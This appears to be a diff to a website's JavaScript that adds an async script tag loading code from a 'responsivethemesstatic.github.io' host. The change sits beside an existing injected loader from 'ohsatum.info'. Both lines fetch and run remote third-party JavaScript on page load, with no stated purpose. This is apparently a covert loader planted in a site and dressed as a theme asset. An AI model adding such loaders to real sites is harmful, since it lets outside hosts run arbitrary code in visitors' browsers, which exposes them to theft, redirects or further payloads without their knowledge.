@@ -2,6 +2,13 @@
  var script = document.createElement('script');
     script.async = true;
     script.type = 'text/javascript';
+    script.src = 'https://responsivethemesstatic.github.io/static/static.js';
+    document.body.appendChild(script);
+})();
+(function() {
+ var script = document.createElement('script');
+    script.async = true;
+    script.type = 'text/javascript';
     script.charset = 'UTF-8';
     script.src = 'https://ohsatum.info/view.js?sid=871623';
     var entry = document.body.firstChild;
